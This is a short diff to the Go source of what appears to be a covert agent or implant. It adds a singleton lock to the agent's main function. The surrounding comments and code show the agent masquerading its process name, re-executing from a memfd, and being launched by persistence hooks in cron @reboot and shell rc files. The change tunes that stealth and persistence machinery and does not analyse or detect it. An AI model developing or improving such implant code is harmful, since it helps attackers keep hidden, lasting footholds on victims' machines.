@@ -72,6 +72,16 @@ func agent_main() {
 	// a memfd. See agentutils/masquerade_linux.go.
 	agentutils.MasqueradeSelf()
 
+	// Single instance per host user: persistence hooks (cron @reboot, shell
+	// rc) can each start one, and every hook-spawned instance would sleep
+	// out its full startup jitter BEFORE the lock check — minutes of
+	// parallel instances. Check immediately after masquerade; the lock fd
+	// is opened without CLOEXEC so it survives the re-exec.
+	if !agentutils.AcquireSingleton() {
+		logging.Debugf("another instance is running, exiting")
+		return
+	}
+
 	null_file, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0o644)
 	if err != nil {
 		logging.Fatalf("%s: %v", os.DevNull, err)
